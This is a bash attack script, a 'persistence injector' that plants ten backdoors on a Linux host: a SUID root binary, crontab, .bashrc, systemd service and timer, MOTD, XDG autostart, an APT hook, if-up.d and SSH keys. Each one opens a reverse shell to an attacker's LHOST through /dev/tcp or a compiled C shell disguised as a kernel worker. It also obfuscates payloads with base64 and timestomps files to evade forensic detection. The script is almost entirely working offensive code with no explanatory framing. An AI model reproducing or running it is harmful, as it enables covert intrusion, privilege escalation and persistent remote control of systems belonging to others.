#!/bin/bash

# Persistence Injector (Obfuscated + Stealth Timestomping)
# Usage: ./injector.sh <LHOST> [option]
# Options: --stealth (Use C Binary), --clean (Remove Backdoors)

LHOST=$1

if [ -z "$LHOST" ]; then
    echo "Usage: ./injector.sh <LHOST> [--stealth|--clean]"
    exit 1
fi

echo "[*] Starting Persistence Injection targeting $LHOST..."

MODE="base64"
if [ "$2" == "--stealth" ] || [ "$3" == "--stealth" ]; then
    echo "[*] Mode: STEALTH (C Binary Compiling)"
    if command -v gcc >/dev/null 2>&1; then
        MODE="c_stealth"
    else
        echo "[!] Warning: gcc not found. Falling back to Base64 mode."
    fi
fi

# Function: Generate Payload String (Command to execute)
gen_payload() {
    local port=$1
    
    if [ "$MODE" == "c_stealth" ]; then
        local func_bin_name=".worker_sys_${port}"
        local func_bin_path="/var/tmp/${func_bin_name}"
        local func_src_path="/var/tmp/${func_bin_name}.c"
        
        if [ -f "masquerade.c" ]; then
            cat masquerade.c > $func_src_path
        else
            echo '#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
int main(){
    if(fork()>0)return 0;
    struct sockaddr_in s;
    s.sin_family=AF_INET;
    s.sin_addr.s_addr=inet_addr("PLACEHOLDER_IP");
    s.sin_port=htons(PLACEHOLDER_PORT);
    int d=socket(AF_INET,SOCK_STREAM,0);
    if(connect(d,(struct sockaddr*)&s,sizeof(s))!=0)return 1;
    dup2(d,0);dup2(d,1);dup2(d,2);
    char *a[]={"[kworker/u4:0]","-p","-i",NULL};
    execve("/bin/bash",a,NULL);
}' > $func_src_path
        fi
        
        sed -i "s/127.0.0.1/$LHOST/g" $func_src_path
        sed -i "s/PLACEHOLDER_IP/$LHOST/g" $func_src_path
        sed -i "s/4444/$port/g" $func_src_path
        sed -i "s/PLACEHOLDER_PORT/$port/g" $func_src_path
        
        gcc $func_src_path -o $func_bin_path 2>/dev/null
        rm $func_src_path
        chmod +x $func_bin_path
        
        echo "$func_bin_path"
        
    else
        local cmd="bash -i >& /dev/tcp/$LHOST/$port 0>&1"
        local b64=$(echo -n "$cmd" | base64 -w 0)
        echo "echo $b64 | base64 -d | bash"
    fi
}

# Function: Restore Timestamp (Stealthy)
# Uses Python/Perl to invoke utime syscall directly, avoiding 'touch' binary signature.
restore_time() {
    local file=$1
    local atime=$2
    local mtime=$3
    
    # Method 1: Python3
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import os; os.utime('$file', ($atime, $mtime))" 2>/dev/null
        return
    fi
    
    # Method 2: Python2
    if command -v python >/dev/null 2>&1; then
        python -c "import os; os.utime('$file', ($atime, $mtime))" 2>/dev/null
        return
    fi
    
    # Method 3: Perl
    if command -v perl >/dev/null 2>&1; then
        perl -e "utime $atime, $mtime, '$file'" 2>/dev/null
        return
    fi
    
    # Fallback to touch if nothing else exists (Risky but necessary)
    touch -a -d @$atime "$file" 2>/dev/null
    touch -m -d @$mtime "$file" 2>/dev/null
}

# Function: Timestomp Append
ts_append() {
    local file=$1
    local content=$2
    
    if [ -f "$file" ]; then
        echo "[*] Timestomping $file (via Syscall)..."
        
        # Get epochs
        # stat -c %X (atime) %Y (mtime)
        local times=$(stat -c "%X %Y" "$file" 2>/dev/null)
        local atime=$(echo $times | awk '{print $1}')
        local mtime=$(echo $times | awk '{print $2}')
        
        # Append
        echo "$content" >> "$file"
        
        # Restore
        if [ ! -z "$atime" ] && [ ! -z "$mtime" ]; then
            restore_time "$file" "$atime" "$mtime"
        fi
    else
        echo "$content" >> "$file"
    fi
}

# Function: Timestomp File to Match Reference
# Usage: ts_match <target_file> <reference_file>
ts_match() {
    local target=$1
    local ref=$2
    
    if [ -f "$ref" ] && [ -f "$target" ]; then
        local times=$(stat -c "%X %Y" "$ref" 2>/dev/null)
        local atime=$(echo $times | awk '{print $1}')
        local mtime=$(echo $times | awk '{print $2}')
        if [ ! -z "$atime" ]; then
            restore_time "$target" "$atime" "$mtime"
        fi
    fi
}

# Cleanup Mode Logic
if [ "$2" == "--clean" ] || [ "$3" == "--clean" ]; then
    echo "[!] Mode: CLEANUP (Removing backdoors)"
    
    rm -f /var/tmp/croissant
    echo "[-] Removed SUID Binary"

    PAYLOAD=$(gen_payload 4002)
    (crontab -l 2>/dev/null | grep -Fv "$PAYLOAD") | crontab - 2>/dev/null
    echo "[-] Cleaned Crontab"

    PAYLOAD=$(gen_payload 4003)
    if [ -f ~/.bashrc ]; then
        # Capture time before sed/grep
        TIMES=$(stat -c "%X %Y" ~/.bashrc 2>/dev/null)
        grep -Fv "$PAYLOAD" ~/.bashrc > ~/.bashrc.tmp && mv ~/.bashrc.tmp ~/.bashrc
        # Restore
        AT=$(echo $TIMES | awk '{print $1}')
        MT=$(echo $TIMES | awk '{print $2}')
        restore_time ~/.bashrc "$AT" "$MT"
        echo "[-] Cleaned .bashrc"
    fi

    IFUP="/etc/network/if-up.d/upstart"
    PAYLOAD=$(gen_payload 4004)
    if [ -f "$IFUP" ]; then
        TIMES=$(stat -c "%X %Y" "$IFUP" 2>/dev/null)
        grep -Fv "$PAYLOAD" "$IFUP" > "$IFUP.tmp" && mv "$IFUP.tmp" "$IFUP"
        AT=$(echo $TIMES | awk '{print $1}')
        MT=$(echo $TIMES | awk '{print $2}')
        restore_time "$IFUP" "$AT" "$MT"
        echo "[-] Cleaned if-up.d"
    fi

    systemctl --user stop persistence.service 2>/dev/null
    systemctl --user disable persistence.service 2>/dev/null
    rm -f ~/.config/systemd/user/persistence.service
    echo "[-] Removed Systemd User Service"

    systemctl stop backdoor.timer 2>/dev/null
    systemctl disable backdoor.timer 2>/dev/null
    rm -f /etc/systemd/system/backdoor.service /etc/systemd/system/backdoor.timer
    echo "[-] Removed Systemd Timer"

    MOTD="/etc/update-motd.d/00-header"
    PAYLOAD=$(gen_payload 4007)
    if [ -f "$MOTD" ]; then
         TIMES=$(stat -c "%X %Y" "$MOTD" 2>/dev/null)
         grep -Fv "$PAYLOAD" "$MOTD" > "$MOTD.tmp" && mv "$MOTD.tmp" "$MOTD"
         AT=$(echo $TIMES | awk '{print $1}')
         MT=$(echo $TIMES | awk '{print $2}')
         restore_time "$MOTD" "$AT" "$MT"
         echo "[-] Cleaned MOTD"
    fi

    rm -f "$HOME/.config/autostart/update-helper.desktop"
    echo "[-] Removed Autostart"

    rm -f "/etc/apt/apt.conf.d/42backdoor"
    echo "[-] Removed APT Config"

    if [ -f ~/.ssh/authorized_keys ]; then
        TIMES=$(stat -c "%X %Y" ~/.ssh/authorized_keys 2>/dev/null)
        grep -v "# backdoor key for port 4010 access" ~/.ssh/authorized_keys > ~/.ssh/authorized_keys.tmp && mv ~/.ssh/authorized_keys.tmp ~/.ssh/authorized_keys
        AT=$(echo $TIMES | awk '{print $1}')
        MT=$(echo $TIMES | awk '{print $2}')
        restore_time ~/.ssh/authorized_keys "$AT" "$MT"
        echo "[-] Cleaned SSH Keys"
    fi
    
    echo "[*] Cleanup Complete."
    exit 0
fi


# 1. SUID Binary (Port 4001)
echo "[+] 1. Injecting SUID Binary..."
if command -v gcc >/dev/null 2>&1; then
    TMPDIR2="/var/tmp"
    PAYLOAD=$(gen_payload 4001)
    PAYLOAD_C=$(echo "$PAYLOAD" | sed 's/"/\\"/g')
    
    cat <<EOF > $TMPDIR2/croissant.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void){
    setresuid(0, 0, 0);
    system("$PAYLOAD_C");
    return 0;
}
EOF
    gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
    # Match ls time
    ts_match $TMPDIR2/croissant /bin/ls
    
    rm $TMPDIR2/croissant.c
    chown root:root $TMPDIR2/croissant 2>/dev/null
    chmod 4777 $TMPDIR2/croissant 2>/dev/null
else
    echo "[-] Skipped 1 (gcc not found)"
fi

# 2. Crontab (Port 4002)
echo "[+] 2. Injecting Crontab..."
PAYLOAD=$(gen_payload 4002)
(crontab -l 2>/dev/null; echo "@reboot sleep 60 && $PAYLOAD") | crontab - 2>/dev/null

# 3. Bash Configuration (Port 4003)
echo "[+] 3. Injecting .bashrc..."
PAYLOAD=$(gen_payload 4003)
ts_append ~/.bashrc "nohup $PAYLOAD >/dev/null 2>&1 &"

# 4. Startup Service (Upstart/If-up) (Port 4004)
echo "[+] 4. Injecting if-up.d..."
PAYLOAD=$(gen_payload 4004)
IFUP="/etc/network/if-up.d/upstart"
if [ -d "/etc/network/if-up.d" ]; then
    ts_append $IFUP "$PAYLOAD &"
    chmod +x $IFUP
fi

# 5. Systemd User Service (Port 4005)
echo "[+] 5. Injecting Systemd User Service..."
PAYLOAD=$(gen_payload 4005)
mkdir -p ~/.config/systemd/user/
SERVICE_FILE="$HOME/.config/systemd/user/persistence.service"
cat <<EOF > $SERVICE_FILE
[Unit]
Description=User Sync Service

[Service]
ExecStart=/bin/bash -c "$PAYLOAD"
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF
ts_match $SERVICE_FILE ~/.config/systemd/user

systemctl --user enable persistence.service 2>/dev/null
systemctl --user start persistence.service 2>/dev/null

# 6. Systemd Timer (Port 4006)
echo "[+] 6. Injecting Systemd Timer..."
PAYLOAD=$(gen_payload 4006)
SERVICE_PATH="/etc/systemd/system"
if [ -w "$SERVICE_PATH" ]; then
    cat <<EOF > $SERVICE_PATH/backdoor.service
[Unit]
Description=System Check

[Service]
Type=simple
ExecStart=/bin/bash -c "$PAYLOAD"
EOF
    cat <<EOF > $SERVICE_PATH/backdoor.timer
[Unit]
Description=System Check Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target
EOF
    ts_match $SERVICE_PATH/backdoor.service /etc/passwd
    ts_match $SERVICE_PATH/backdoor.timer /etc/passwd
    
    systemctl enable backdoor.timer 2>/dev/null
    systemctl start backdoor.timer 2>/dev/null
else
    echo "[-] Skipped 6 (No write permission)"
fi

# 7. MOTD (Port 4007)
echo "[+] 7. Injecting MOTD..."
PAYLOAD=$(gen_payload 4007)
MOTD="/etc/update-motd.d/00-header"
if [ -w "$MOTD" ]; then
    ts_append $MOTD "$PAYLOAD &"
else
     echo "[-] Skipped 7 (No write permission)"
fi

# 8. Autostart (Port 4008)
echo "[+] 8. Injecting XDG Autostart..."
PAYLOAD=$(gen_payload 4008)
AUTOSTART_DIR="$HOME/.config/autostart"
mkdir -p $AUTOSTART_DIR
DESKTOP_FILE="$AUTOSTART_DIR/update-helper.desktop"
cat <<EOF > $DESKTOP_FILE
[Desktop Entry]
Type=Application
Name=Update Helper
Exec=bash -c "$PAYLOAD"
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF
ts_match $DESKTOP_FILE $AUTOSTART_DIR

# 9. APT (Port 4009)
echo "[+] 9. Injecting APT Config..."
PAYLOAD=$(gen_payload 4009)
APT_CONF="/etc/apt/apt.conf.d/42backdoor"
if [ -d "/etc/apt/apt.conf.d" ] && [ -w "/etc/apt/apt.conf.d" ]; then
    echo "APT::Update::Pre-Invoke {\"nohup bash -c '$PAYLOAD' 2> /dev/null &\"};" > $APT_CONF
    ts_match $APT_CONF /etc/apt/apt.conf.d
else
    echo "[-] Skipped 9 (No permission)"
fi

# 10. SSH (Port 4010)
echo "[+] 10. Injecting SSH Key..."
mkdir -p ~/.ssh
chmod 700 ~/.ssh
ts_append ~/.ssh/authorized_keys "# backdoor key for port 4010 access"
chmod 600 ~/.ssh/authorized_keys

echo "[*] Injection Complete. Check listener on $LHOST ports 4001-4010."
